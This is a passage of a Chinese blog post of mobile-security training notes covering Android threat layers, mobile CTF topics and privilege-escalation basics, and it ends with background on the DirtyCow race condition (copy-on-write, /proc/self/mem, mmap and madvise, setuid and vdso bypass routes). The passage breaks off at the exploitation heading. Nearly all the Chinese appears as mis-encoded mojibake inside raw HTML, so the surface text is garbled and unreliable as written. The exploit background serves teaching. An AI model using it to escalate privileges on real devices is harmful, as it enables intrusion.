title="FrameWorkå±‚"></a>FrameWorkå±‚</h4><p>ä¸»è¦å¨èƒï¼šéšç§çªƒå–ã€æ‹¦æˆªå¹¿æ’­ã€å‹’ç´¢ã€è¿œæ§ã€æ¼æ´åˆ©ç”¨ã€‚å°¤å…¶æ˜¯åœ¨Nativeå±‚ï¼Œå¯¹æŠ—åˆ†æã€éšè—è‡ªèº«ã€‚</p><h4 id="Kernelå±‚"><a href="#Kernelå±‚" class="headerlink" title="Kernelå±‚"></a>Kernelå±‚</h4><p>ä¸»è¦å¨èƒï¼šç³»ç»Ÿç ´åã€ææƒ</p><h4 id="RottenSys"><a href="#RottenSys" class="headerlink" title="RottenSys"></a>RottenSys</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_9.png" alt="img"></p><h3 id="æœºå™¨å­¦ä¹ åº”ç”¨"><a href="#æœºå™¨å­¦ä¹ åº”ç”¨" class="headerlink" title="æœºå™¨å­¦ä¹ åº”ç”¨"></a>æœºå™¨å­¦ä¹ åº”ç”¨</h3><ul><li>æ–‡ä»¶ç›¸ä¼¼æ€§æ£€éªŒ</li><li>èšç±»åˆ†æ</li><li>éšæœºæ€§è¯†åˆ«</li><li>è‰²æƒ…åº”ç”¨è¯†åˆ«</li></ul><h3 id="åŸºäºæ ·æœ¬è¿è¥çš„äº’è”ç½‘é£æ§"><a href="#åŸºäºæ ·æœ¬è¿è¥çš„äº’è”ç½‘é£æ§" class="headerlink" title="åŸºäºæ ·æœ¬è¿è¥çš„äº’è”ç½‘é£æ§"></a>åŸºäºæ ·æœ¬è¿è¥çš„äº’è”ç½‘é£æ§</h3><p>ä¸å¬è€å¸ˆè¯´ï¼ŒçœŸä¸çŸ¥é“äº’è”ç½‘é»‘ç°äº§å¸‚åœºè§„æ¨¡è¿™ä¹ˆå¤§ã€‚</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_10.png" alt="img"></p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_11.png" alt="img"></p><h2 id="ç¬¬å››å¤©-01æœˆ16æ—¥"><a href="#ç¬¬å››å¤©-01æœˆ16æ—¥" class="headerlink" title="ç¬¬å››å¤© 01æœˆ16æ—¥"></a>ç¬¬å››å¤© 01æœˆ16æ—¥</h2><p>CTFä¸­çš„ç§»åŠ¨å®‰å…¨å‡ºé¢˜æ€»ä½“ä»¥å®‰å“APPé€†å‘å±…å¤šï¼Œè€ƒå¯Ÿç‚¹å¤šä¸ºé€†å‘åŸºæœ¬åŠŸã€‚Pwnæ–¹å‘å¤šä¸ºç»„ä»¶æ¼æ´ã€WebViewæ¼æ´ï¼ŒNativeæ¼æ´åˆ©ç”¨ã€‚</p><h3 id="ä¸»è¦æ˜¯æ‘¸é±¼"><a href="#ä¸»è¦æ˜¯æ‘¸é±¼" class="headerlink" title="ä¸»è¦æ˜¯æ‘¸é±¼"></a>ä¸»è¦æ˜¯æ‘¸é±¼</h3><h2 id="ç¬¬äº”å¤©-01æœˆ17æ—¥"><a href="#ç¬¬äº”å¤©-01æœˆ17æ—¥" class="headerlink" title="ç¬¬äº”å¤© 01æœˆ17æ—¥"></a>ç¬¬äº”å¤© 01æœˆ17æ—¥</h2><p>åˆ†å¸ƒå¼ç½‘ç»œ&amp;åˆ†å¸ƒå¼ååŒ</p><h3 id="åˆ†å¸ƒå¼ç½‘ç»œæ¦‚è¿°"><a href="#åˆ†å¸ƒå¼ç½‘ç»œæ¦‚è¿°" class="headerlink" title="åˆ†å¸ƒå¼ç½‘ç»œæ¦‚è¿°"></a>åˆ†å¸ƒå¼ç½‘ç»œæ¦‚è¿°</h3><p><strong>åˆ†å¸ƒå¼ç½‘ç»œ</strong>æ˜¯ç”±ä¸åŒåœ°ç‚¹çš„è®¡ç®—æœºç³»ç»Ÿè¿æˆçš„ç½‘ç»œç»“æ„ã€‚</p><p><strong>åˆ†å¸ƒå¼ç³»ç»Ÿ</strong>æ˜¯ä¸€ä¸ªç¡¬ä»¶æˆ–è½¯ä»¶ç»„ä»¶åˆ†å¸ƒåœ¨ä¸åŒçš„ç½‘ç»œè®¡ç®—æœºä¸Šï¼Œå½¼æ­¤ä¹‹é—´ä»…ä»…é€šè¿‡æ¶ˆæ¯ä¼ é€’è¿›è¡Œé€šä¿¡å’Œåè°ƒçš„ç³»ç»Ÿã€‚</p><h3 id="åŸºäºWIFI-Directçš„æ¼æ´æŒ–æ˜"><a href="#åŸºäºWIFI-Directçš„æ¼æ´æŒ–æ˜" class="headerlink" title="åŸºäºWIFI-Directçš„æ¼æ´æŒ–æ˜"></a>åŸºäºWIFI-Directçš„æ¼æ´æŒ–æ˜</h3><h3 id="è“ç‰™æ¼æ´å­¦ä¹ "><a href="#è“ç‰™æ¼æ´å­¦ä¹ " class="headerlink" title="è“ç‰™æ¼æ´å­¦ä¹ "></a>è“ç‰™æ¼æ´å­¦ä¹ </h3><h2 id="ç¬¬å…­å¤©-01æœˆ18æ—¥"><a href="#ç¬¬å…­å¤©-01æœˆ18æ—¥" class="headerlink" title="ç¬¬å…­å¤© 01æœˆ18æ—¥"></a>ç¬¬å…­å¤© 01æœˆ18æ—¥</h2><p>å®‰å“ææƒæ¼æ´åŸºç¡€ã€åŸç†ã€åˆ©ç”¨å’Œå‘ç°æ–¹æ³•ç®€ä»‹ã€‚</p><p>åŠ¨æ‰‹ï¼šå†…æ ¸ä»£ç ç†Ÿæ‚‰ã€ç¼–è¯‘ã€‚</p><h3 id="å®‰å“ææƒæ¼æ´åŸºç¡€"><a href="#å®‰å“ææƒæ¼æ´åŸºç¡€" class="headerlink" title="å®‰å“ææƒæ¼æ´åŸºç¡€"></a>å®‰å“ææƒæ¼æ´åŸºç¡€</h3><p>Android NativeLibå’ŒKernelç®€ä»‹å’Œæ”»å‡»é¢ã€‚Androidå®Œæ•´ç³»ç»Ÿæºç c&#x2F;c++ç›¸æ¯”javaæ›´å¤šã€‚</p><p>APPæ¼æ´ vs ç³»ç»Ÿæ¼æ´ï¼šå½±å“è®¾å¤‡ã€å½±å“ç”¨æˆ·ã€æŸ¥æ‰¾éš¾åº¦ã€ä¿®è¡¥éš¾åº¦ã€‚</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E6%94%BB%E5%87%BB%E9%9D%A2.png" alt="img"></p><h4 id="å®‰å“åº•å±‚å®‰å…¨æ¶æ„ç®€ä»‹"><a href="#å®‰å“åº•å±‚å®‰å…¨æ¶æ„ç®€ä»‹" class="headerlink" title="å®‰å“åº•å±‚å®‰å…¨æ¶æ„ç®€ä»‹"></a>å®‰å“åº•å±‚å®‰å…¨æ¶æ„ç®€ä»‹</h4><p>è¿™é‡Œåœ¨ç¬¬ä¸€å¤©è®²è¿‡ï¼Œä¸åœ¨èµ˜è¿°ã€‚å†è¡¥å……ä¸€ä¸‹å¼€æºä»£ç æ‰€éµå¾ªçš„åè®®ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BC%80%E6%BA%90.png" alt="img"></p><p>å¯¹äºå®‰å“å¼€æºé—®é¢˜ï¼Œ<code>linux kernel</code>ä½¿ç”¨<code>GPL</code>è®¸å¯è¯ã€‚</p><p>ç¡¬ä»¶å¼€å‘å•†ä¸æ„¿æ„å°†è‡ªå·±çš„ä»£ç å…¬å¼€ï¼Œæ‰€ä»¥è°·æ­Œç”¨äº†ï¼šHALå±‚ã€‚</p><ul><li>ä¿®æ”¹å†…æ ¸ï¼Œå¢åŠ ä¸€äº›HALçš„æ¥å£ï¼Œè¿™äº›ä»£ç ä½¿ç”¨GPLåè®®ï¼Œå®Œå…¨å…¬å¼€ã€‚</li><li>å¢åŠ HALå±‚ï¼Œè°ƒç”¨ä¸Šä¸€æ­¥å®šä¹‰å¥½çš„å†…æ ¸æ¥å£ã€‚</li><li>åœ¨HALå±‚ä¸­å®šä¹‰å¥½ä¸Šå±‚è°ƒç”¨æ‰€éœ€çš„ç»Ÿä¸€APIã€‚</li></ul><p>Androidåº•å±‚å®‰å…¨æ¡†æ¶åŠæ”»å‡»ç¼“é‡ŠæŠ€æœ¯ï¼š</p><p>1ã€è‡ªä¸»è®¿é—®æ§åˆ¶</p><ul><li>åŸºäºuidã€gidã€‚å®¹æ˜“è¢«çªç ´ï¼Œä½†æ€»æ¯”æ²¡æœ‰å¼ºã€‚</li></ul><p>2ã€å¼ºåˆ¶è®¿é—®æ§åˆ¶</p><ul><li>SELinuxï¼Œå®Œå–„ä¹‹åæ”»ç ´éå¸¸å›°éš¾ï¼Œæå¤§é™ä½æ”»å‡»åçš„å±å®³ã€‚</li></ul><p>3ã€éªŒè¯å¯åŠ¨æ¨¡å¼ï¼ˆVerified Bootï¼‰</p><ul><li>é€šè¿‡ç¡¬ä»¶å¯†é’¥ï¼Œé€æ­¥éªŒè¯æ•´ä¸ªç³»ç»Ÿã€‚ä¸€æ—¦å‡ºå‚ä¹‹åï¼Œä¸å¯ä¿®æ”¹ã€‚ä¿®æ”¹ä¹‹åç³»ç»Ÿæ— æ³•å¯åŠ¨ã€‚ï¼ˆæµ‹è¯•ã€è§£é”BootLoaderåå¯ä»¥å¯åŠ¨ï¼‰ã€‚</li></ul><p>4ã€ä»£ç ç­¾åå’Œå¹³å°å¯†é’¥</p><ul><li>æ— æ³•åˆ·å…¥ä»»ä½•éç­¾åé•œåƒã€‚Systemçº§åˆ«çš„ç­¾åéªŒè¯ã€‚</li></ul><p>Rootç›¸å…³åŸºç¡€çŸ¥è¯†ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/root%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.png" alt="img"></p><h4 id="åŸç”Ÿä»£ç åº“åŠå…¶æ”»å‡»é¢"><a href="#åŸç”Ÿä»£ç åº“åŠå…¶æ”»å‡»é¢" class="headerlink" title="åŸç”Ÿä»£ç åº“åŠå…¶æ”»å‡»é¢"></a>åŸç”Ÿä»£ç åº“åŠå…¶æ”»å‡»é¢</h4><h4 id="å†…æ ¸æ”»å‡»é¢"><a href="#å†…æ ¸æ”»å‡»é¢" class="headerlink" title="å†…æ ¸æ”»å‡»é¢"></a>å†…æ ¸æ”»å‡»é¢</h4><h3 id="Androidæ¡†æ¶ææƒæ¼æ´"><a href="#Androidæ¡†æ¶ææƒæ¼æ´" class="headerlink" title="Androidæ¡†æ¶ææƒæ¼æ´"></a>Androidæ¡†æ¶ææƒæ¼æ´</h3><ul><li>ååºåˆ—åŒ–æ¼æ´ï¼š7911</li></ul><h3 id="åŠ¨æ‰‹ï¼šå†…æ ¸ä»£ç ç†Ÿæ‚‰ã€ä¸‹è½½ã€å’Œç¼–è¯‘"><a href="#åŠ¨æ‰‹ï¼šå†…æ ¸ä»£ç ç†Ÿæ‚‰ã€ä¸‹è½½ã€å’Œç¼–è¯‘" class="headerlink" title="åŠ¨æ‰‹ï¼šå†…æ ¸ä»£ç ç†Ÿæ‚‰ã€ä¸‹è½½ã€å’Œç¼–è¯‘"></a>åŠ¨æ‰‹ï¼šå†…æ ¸ä»£ç ç†Ÿæ‚‰ã€ä¸‹è½½ã€å’Œç¼–è¯‘</h3><h4 id="ç«äº‰æ¡ä»¶æ¼æ´ï¼šè„ç‰›ï¼ˆDirtyCowï¼‰"><a href="#ç«äº‰æ¡ä»¶æ¼æ´ï¼šè„ç‰›ï¼ˆDirtyCowï¼‰" class="headerlink" title="ç«äº‰æ¡ä»¶æ¼æ´ï¼šè„ç‰›ï¼ˆDirtyCowï¼‰"></a>ç«äº‰æ¡ä»¶æ¼æ´ï¼šè„ç‰›ï¼ˆDirtyCowï¼‰</h4><p>åŸºç¡€çŸ¥è¯†æ¢³ç†ï¼š</p><ul><li>è™šæ‹Ÿå†…å­˜ç®¡ç†å’Œå†™æ—¶å¤åˆ¶ï¼ˆ<code>copy on write</code>ï¼‰ã€é¡µå¼å†…å­˜ç®¡ç†å’Œç¼ºé¡µä¸­æ–­ã€<code>linux</code>å†…å­˜è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆ<code>Proc</code>ï¼‰ã€ç«äº‰æ¡ä»¶ï¼ˆ<code>Race condition</code>ï¼‰ã€ç›¸å…³å‡½æ•°ã€‚</li></ul><p>æ¼æ´åˆ†æï¼š</p><ul><li>å†™æ—¶å¤åˆ¶ï¼ˆ<code>copy on write</code>ï¼‰ã€ç«äº‰æ¡ä»¶ï¼ˆ<code>Race condition</code>ï¼‰ã€‚</li></ul><p>åˆ©ç”¨æ–¹å¼ï¼š</p><ul><li><code>set-uid</code>ä½ã€<code>vdso</code>ç»•è¿‡<code>selinux</code>ã€‚</li></ul><h5 id="å†™æ—¶å¤åˆ¶"><a href="#å†™æ—¶å¤åˆ¶" class="headerlink" title="å†™æ—¶å¤åˆ¶"></a>å†™æ—¶å¤åˆ¶</h5><p>å†™å…¥æ—¶å¤åˆ¶æ˜¯ä¸€ç§è®¡ç®—æœºç¨‹åºè®¾è®¡é¢†åŸŸçš„ä¼˜åŒ–ç­–ç•¥ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œå¦‚æœæœ‰å¤šä¸ªè°ƒç”¨è€…åŒæ—¶è¯·æ±‚ç›¸åŒèµ„æºï¼Œä»–ä»¬ä¼šå…±åŒè·å–ç›¸åŒçš„æŒ‡é’ˆæŒ‡å‘ç›¸åŒçš„èµ„æºï¼Œç›´åˆ°æŸä¸ªè°ƒç”¨è€…è¯•å›¾ä¿®æ”¹èµ„æºçš„å†…å®¹æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£å¤åˆ¶ä¸€ä»½ä¸“ç”¨å‰¯æœ¬ï¼ˆ<code>private copy</code>ï¼‰ç»™è¯¥è°ƒç”¨è€…ï¼Œè€Œå…¶ä»–è°ƒç”¨è€…æ‰€è§åˆ°çš„æœ€åˆçš„èµ„æºä»ç„¶ä¿æŒä¸å˜ã€‚è¿™ä¸ªè¿‡ç¨‹å¯¹å…¶ä»–çš„è°ƒç”¨è€…æ˜¯é€æ˜çš„ï¼ˆ<code>transparently</code>ï¼‰ã€‚æ­¤ä½œæ³•çš„ä¸»è¦ä¼˜ç‚¹æ˜¯å¦‚æœè°ƒç”¨è€…æ²¡æœ‰ä¿®æ”¹è¯¥èµ„æºï¼Œå°±ä¸ä¼šæœ‰å‰¯æœ¬ï¼ˆ<code>private copy</code>ï¼‰è¢«å»ºç«‹ï¼Œå› æ­¤å¤šä¸ªè°ƒç”¨è€…åªæ˜¯è¯»å–æ“ä½œæ˜¯å¯ä»¥å…±äº«åŒä¸€ä»½èµ„æºã€‚æé«˜ç‰©ç†å†…å­˜åˆ©ç”¨ç‡ï¼šè™šæ‹Ÿå†…å­˜ï¼Œç‰©ç†å†…å­˜ï¼Œå…±äº«åªè¯»å­˜å‚¨ã€‚æé«˜forkç­‰æ‰§è¡Œé€Ÿåº¦ã€‚</p><p>Pagecacheï¼šMmapä¹‹åä¸å»è¯»å†™ï¼Œä¸è½½å…¥å†…å­˜ï¼Œå¦‚æœè¯»å†™ï¼Œè½½å…¥å†…å­˜ã€‚</p><h5 id="é¡µå¼å†…å­˜ç®¡ç†å’Œç¼ºé¡µä¸­æ–­"><a href="#é¡µå¼å†…å­˜ç®¡ç†å’Œç¼ºé¡µä¸­æ–­" class="headerlink" title="é¡µå¼å†…å­˜ç®¡ç†å’Œç¼ºé¡µä¸­æ–­"></a>é¡µå¼å†…å­˜ç®¡ç†å’Œç¼ºé¡µä¸­æ–­</h5><p>Linuxå†…å­˜ç®¡ç†ï¼šæ¢å‡ºæš‚æ—¶ä¸ç”¨çš„å†…å­˜åˆ°å¤–å­˜ï¼Œç”¨çš„æ—¶å€™å†æ¢å›æ¥ã€‚åˆ†é¡µï¼ˆ4kbï¼‰ç®¡ç†ã€‚å¦‚æœè®¿é—®å‘ç°è¦ç”¨çš„ä¸åœ¨å†…å­˜ä¸­ï¼Œè¿›ç¨‹è®¿é—®å‡ºç°ç¼ºé¡µä¸­æ–­ï¼Œä¹‹åå†…æ ¸è´Ÿè´£å°†è¦ç”¨çš„é¡µé‡æ–°è£…å…¥å†…å­˜ï¼Œå¦‚æœå†…å­˜å·²æ»¡ï¼Œå°†æš‚æ—¶ä¸ç”¨çš„å…¶ä»–é¡µæ¢å‡ºå¤–å­˜ã€‚è¿™ä¸ªè¿‡ç¨‹ç”±å†…æ ¸è´Ÿè´£å¤„ç†ï¼Œç”¨æˆ·è¿›ç¨‹æ— æ„ŸçŸ¥ã€‚</p><h5 id="ç¼ºé¡µä¸­æ–­"><a href="#ç¼ºé¡µä¸­æ–­" class="headerlink" title="ç¼ºé¡µä¸­æ–­"></a>ç¼ºé¡µä¸­æ–­</h5><ul><li>ç¡¬ä»¶é™·å…¥å†…æ ¸ï¼Œåœ¨å †æ ˆä¸­ä¿å­˜ç¨‹åºè®¡æ•°å™¨ã€‚å¤§å¤šæ•°æœºå™¨å°†å½“å‰æŒ‡ä»¤çš„å„ç§çŠ¶æ€ä¿¡æ¯ä¿<br>å­˜åœ¨ç‰¹æ®Šçš„CPUå¯„å­˜å™¨ä¸­ã€‚</li><li>å¯åŠ¨ä¸€ä¸ªæ±‡ç¼–ä»£ç ä¾‹ç¨‹ä¿å­˜é€šç”¨å¯„å­˜å™¨å’Œå…¶ä»–æ˜“å¤±çš„ä¿¡æ¯ï¼Œä»¥å…è¢«æ“ä½œç³»ç»Ÿç ´åã€‚è¿™<br>ä¸ªä¾‹ç¨‹å°†æ“ä½œç³»ç»Ÿä½œä¸ºä¸€ä¸ªå‡½æ•°æ¥è°ƒç”¨ã€‚</li><li>å½“æ“ä½œç³»ç»Ÿå‘ç°ä¸€ä¸ªç¼ºé¡µä¸­æ–­æ—¶ï¼Œå°è¯•å‘ç°éœ€è¦å“ªä¸ªè™šæ‹Ÿé¡µé¢ã€‚é€šå¸¸ä¸€ä¸ªç¡¬ä»¶å¯„å­˜å™¨<br>åŒ…å«äº†è¿™ä¸€ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œæ“ä½œç³»ç»Ÿå¿…é¡»æ£€ç´¢ç¨‹åºè®¡æ•°å™¨ï¼Œå–å‡ºè¿™æ¡æŒ‡ä»¤ï¼Œç”¨<br>è½¯ä»¶åˆ†æè¿™æ¡æŒ‡ä»¤ï¼Œçœ‹çœ‹å®ƒåœ¨ç¼ºé¡µä¸­æ–­æ—¶æ­£åœ¨åšä»€ä¹ˆã€‚</li><li>ä¸€æ—¦çŸ¥é“äº†å‘ç”Ÿç¼ºé¡µä¸­æ–­çš„è™šæ‹Ÿåœ°å€ï¼Œæ“ä½œç³»ç»Ÿæ£€æŸ¥è¿™ä¸ªåœ°å€æ˜¯å¦æœ‰æ•ˆï¼Œå¹¶æ£€æŸ¥å­˜å–<br>ä¸ä¿æŠ¤æ˜¯å¦ä¸€è‡´ã€‚å¦‚æœä¸ä¸€è‡´ï¼Œå‘è¿›ç¨‹å‘å‡ºä¸€ä¸ªä¿¡å·æˆ–æ€æ‰è¯¥è¿›ç¨‹ã€‚å¦‚æœåœ°å€æœ‰æ•ˆä¸”<br>æ²¡æœ‰ä¿æŠ¤é”™è¯¯å‘ç”Ÿï¼Œç³»ç»Ÿåˆ™æ£€æŸ¥æ˜¯å¦æœ‰ç©ºé—²é¡µæ¡†ã€‚å¦‚æœæ²¡æœ‰ç©ºé—²é¡µæ¡†ï¼Œæ‰§è¡Œé¡µé¢ç½®æ¢<br>ç®—æ³•å¯»æ‰¾ä¸€ä¸ªé¡µé¢æ¥æ·˜æ±°ã€‚</li><li>å¦‚æœé€‰æ‹©çš„é¡µæ¡†â€œè„â€äº†ï¼Œå®‰æ’è¯¥é¡µå†™å›ç£ç›˜ï¼Œå¹¶å‘ç”Ÿä¸€æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ŒæŒ‚èµ·äº§ç”Ÿç¼º<br>é¡µä¸­æ–­çš„è¿›ç¨‹ï¼Œè®©å…¶ä»–è¿›ç¨‹è¿è¡Œç›´è‡³ç£ç›˜ä¼ è¾“ç»“æŸã€‚æ— è®ºå¦‚ä½•ï¼Œè¯¥é¡µæ¡†è¢«æ ‡è®°ä¸ºå¿™ï¼Œ<br>ä»¥å…å› ä¸ºå…¶ä»–åŸå› è€Œè¢«å…¶ä»–è¿›ç¨‹å ç”¨ã€‚</li><li>ä¸€æ—¦é¡µæ¡†â€œå¹²å‡€â€åï¼ˆæ— è®ºæ˜¯ç«‹åˆ»è¿˜æ˜¯åœ¨å†™å›ç£ç›˜åï¼‰ï¼Œæ“ä½œç³»ç»ŸæŸ¥æ‰¾æ‰€éœ€é¡µé¢åœ¨ç£<br>ç›˜ä¸Šçš„åœ°å€ï¼Œé€šè¿‡ç£ç›˜æ“ä½œå°†å…¶è£…å…¥ã€‚è¯¥é¡µé¢è¢«è£…å…¥åï¼Œäº§ç”Ÿç¼ºé¡µä¸­æ–­çš„è¿›ç¨‹ä»ç„¶è¢«<br>æŒ‚èµ·ï¼Œå¹¶ä¸”å¦‚æœæœ‰å…¶ä»–å¯è¿è¡Œçš„ç”¨æˆ·è¿›ç¨‹ï¼Œåˆ™é€‰æ‹©å¦ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹è¿è¡Œã€‚</li><li>å½“ç£ç›˜ä¸­æ–­å‘ç”Ÿæ—¶ï¼Œè¡¨æ˜è¯¥é¡µå·²ç»è¢«è£…å…¥ï¼Œé¡µè¡¨å·²ç»æ›´æ–°å¯ä»¥åæ˜ å®ƒçš„ä½ç½®ï¼Œé¡µæ¡†ä¹Ÿ<br>è¢«æ ‡è®°ä¸ºæ­£å¸¸çŠ¶æ€ã€‚</li><li>æ¢å¤å‘ç”Ÿç¼ºé¡µä¸­æ–­æŒ‡ä»¤ä»¥å‰çš„çŠ¶æ€ï¼Œç¨‹åºè®¡æ•°å™¨é‡æ–°æŒ‡å‘è¿™æ¡æŒ‡ä»¤ã€‚</li><li>è°ƒåº¦å¼•å‘ç¼ºé¡µä¸­æ–­çš„è¿›ç¨‹ï¼Œæ“ä½œç³»ç»Ÿè¿”å›è°ƒç”¨å®ƒçš„æ±‡ç¼–è¯­è¨€ä¾‹ç¨‹ã€‚</li><li>è¯¥ä¾‹ç¨‹æ¢å¤å¯„å­˜å™¨å’Œå…¶ä»–çŠ¶æ€ä¿¡æ¯ï¼Œè¿”å›åˆ°ç”¨æˆ·ç©ºé—´ç»§ç»­æ‰§è¡Œï¼Œå°±å¥½åƒç¼ºé¡µä¸­æ–­æ²¡æœ‰<br>å‘ç”Ÿè¿‡ä¸€æ ·ã€‚</li></ul><h4 id="linuxå†…å­˜è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆProcï¼‰"><a href="#linuxå†…å­˜è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆProcï¼‰" class="headerlink" title="linuxå†…å­˜è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆProcï¼‰"></a>linuxå†…å­˜è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆProcï¼‰</h4><ul><li><code>/proc/pid/cmdline</code> åŒ…å«äº†ç”¨äºå¼€å§‹è¿›ç¨‹çš„å‘½ä»¤ï¼›</li><li><code>/proc/pid/cwd</code>åŒ…å«äº†å½“å‰è¿›ç¨‹å·¥ä½œç›®å½•çš„ä¸€ä¸ªé“¾æ¥ï¼›</li><li><code>/proc/pid/environ</code> åŒ…å«äº†å¯ç”¨è¿›ç¨‹ç¯å¢ƒå˜é‡çš„åˆ—è¡¨ï¼›</li><li><code>/proc/pid/exe</code> åŒ…å«äº†æ­£åœ¨è¿›ç¨‹ä¸­è¿è¡Œçš„ç¨‹åºé“¾æ¥ï¼›</li><li><code>/proc/pid/fd/</code> è¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ï¼›</li><li><code>/proc/pid/stat</code>åŒ…å«äº†è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼›</li><li><code>/proc/pid/statm</code> åŒ…å«äº†è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨ä¿¡æ¯</li><li><strong><code>/proc/self/maps</code> è¿›ç¨‹è™šæ‹Ÿå†…å­˜ä¸­åŠ è½½çš„æ–‡ä»¶å’Œåº“ç­‰</strong></li><li><strong><code>/proc/self/mem</code>è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå½“å‰è¿›ç¨‹å¯<br>ä»¥é€šè¿‡å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè¯»å†™ä»¥ç›´æ¥è¯»å†™è™šæ‹Ÿå†…å­˜ç©ºé—´</strong></li></ul><h5 id="ç«äº‰æ¡ä»¶æ¼æ´"><a href="#ç«äº‰æ¡ä»¶æ¼æ´" class="headerlink" title="ç«äº‰æ¡ä»¶æ¼æ´"></a>ç«äº‰æ¡ä»¶æ¼æ´</h5><p>ç«äº‰æ¡ä»¶æ˜¯ç³»ç»Ÿä¸­çš„ä¸€ç§åå¸¸ç°è±¡ï¼Œç”±äºç°ä»£Linuxç³»ç»Ÿä¸­å¤§é‡ä½¿ç”¨å¹¶å‘ç¼–ç¨‹ï¼Œå¯¹èµ„æºè¿›è¡Œå…±äº«ï¼Œå¦‚æœäº§ç”Ÿé”™è¯¯çš„è®¿é—®æ¨¡å¼ï¼Œä¾¿å¯èƒ½äº§ç”Ÿå†…å­˜æ³„éœ²ï¼Œç³»ç»Ÿå´©æºƒï¼Œæ•°æ®ç ´åï¼Œç”šè‡³å®‰å…¨é—®é¢˜ã€‚ç«äº‰æ¡ä»¶æ¼æ´å°±æ˜¯å¤šä¸ªè¿›ç¨‹è®¿é—®åŒä¸€èµ„æºæ—¶äº§ç”Ÿçš„æ—¶é—´æˆ–è€…åºåˆ—çš„å†²çªï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªå†²çªæ¥å¯¹ç³»ç»Ÿè¿›è¡Œæ”»å‡»ã€‚</p><h5 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">mmap</span>(<span class="hljs-type">void</span>* start, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)<br></code></pre></td></tr></table></figure><ul><li>å°†ç£ç›˜ä¸Šçš„æ–‡ä»¶æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­ï¼Œå¯¹äºè¿™ä¸ªå‡½æ•°å”¯ä¸€è¦è¯´çš„å°±æ˜¯å½“<code>flags</code>çš„<code>MAP_PRIVATE</code>è¢«ç½®ä¸º<code>1</code>æ—¶ï¼Œå¯¹<code>mmap</code>å¾—åˆ°å†…å­˜æ˜ å°„è¿›è¡Œçš„å†™æ“ä½œä¼šä½¿å†…æ ¸è§¦å‘<code>COW</code>æ“ä½œï¼Œå†™çš„æ˜¯<code>COW</code>åçš„å†…å­˜ï¼Œä¸ä¼šåŒæ­¥åˆ°ç£ç›˜çš„æ–‡ä»¶ä¸­ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">madvice</span>(<span class="hljs-type">caddr_t</span> addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> advice)<br></code></pre></td></tr></table></figure><ul><li>å‘Šè¯‰å†…æ ¸å†…å­˜<code>addrï½addr+len</code>åœ¨æ¥ä¸‹æ¥çš„ä½¿ç”¨çŠ¶å†µï¼Œä»¥ä¾¿å†…æ ¸è¿›è¡Œä¸€äº›è¿›ä¸€æ­¥çš„å†…å­˜ç®¡ç†æ“ä½œã€‚å½“<code>advice</code>ä¸º<code>MADV_DONTNEED</code>æ—¶ï¼Œæ­¤ç³»ç»Ÿè°ƒç”¨ç›¸å½“äºé€šçŸ¥å†…æ ¸<code>addrï½addr+len</code>çš„å†…å­˜åœ¨æ¥ä¸‹æ¥ä¸å†ä½¿ç”¨ï¼Œå†…æ ¸å°†é‡Šæ”¾æ‰è¿™ä¸€å—å†…å­˜ä»¥èŠ‚çœç©ºé—´ï¼Œç›¸åº”çš„é¡µè¡¨é¡¹ä¹Ÿä¼šè¢«ç½®ç©ºã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> count)</span></span><br></code></pre></td></tr></table></figure><ul><li>å‘<code>fd</code>æè¿°ç¬¦æ‰€æŒ‡å‘çš„æ–‡ä»¶å†™å…¥æœ€å¤š<code>count</code>é•¿åº¦çš„<code>buf</code>ä¸­çš„å†…å®¹ã€‚</li></ul><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><p><img 